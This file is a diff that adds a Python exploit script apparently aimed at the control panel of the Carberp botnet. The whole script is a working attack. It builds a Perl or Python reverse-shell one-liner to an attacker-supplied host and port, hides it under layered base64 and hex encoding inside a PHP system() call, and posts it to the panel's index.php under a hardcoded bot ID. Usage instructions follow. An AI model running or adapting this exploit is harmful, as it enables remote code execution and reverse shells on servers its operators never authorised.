@@ -1,0 +1,47 @@
+#!/usr/bin/python
+# Carberp botnet RCE exploit
+# Work in progress, a bit unreliable
+import requests
+import sys
+import payloads
+from payloads import all
+
+def genrshell(lhost, lport, stype):
+    if stype == "perl":
+        rshell = payloads.linux.perl.reverse_oneline(lhost, lport)
+    elif stype == "python":
+        rshell = payloads.linux.python.reverse_oneline(lhost, lport)
+    return rshell
+
+def genencphp(cmd):
+    encoded = cmd.encode('base64')
+    encoded = encoded.strip()
+    encoded = encoded.replace('\n', '')
+    encoded = encoded.encode('base64')
+    encoded = encoded.strip()
+    encoded = encoded.replace('\n', '') # BADCHARS EH? ILL ENCODE THEM SHITS YO
+    raw = """system(base64_decode(base64_decode('%s')));""" %(encoded)
+    hexed = raw.encode('hex')
+    payload = hexed.encode('base64')
+    payload = payload.strip()
+    payload = payload.replace('\n', '')
+    return payload
+
+def hax(url, path, lhost, lport, stype):
+    url = "http://" + url + path + "index.php"
+    cmd = genrshell(lhost, lport, stype)
+    shell = genencphp(cmd)
+    getmeashell = """id=BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV&data=%s""" %(shell)
+    requests.post(url, data=getmeashell)
+
+if len(sys.argv) != 6:
+    print "Usage: %s <url> <path> <lhost> <lport> <perl/python>" %(sys.argv[0])
+    print "Eg: %s bot.net / hax.me 1337 python" %(sys.argv[0])
+    sys.exit(0)
+else:
+    url = sys.argv[1]
+    path = sys.argv[2]
+    lhost = sys.argv[3]
+    lport = sys.argv[4]
+    stype = sys.argv[5]
+    hax(url, path, lhost, lport, stype)
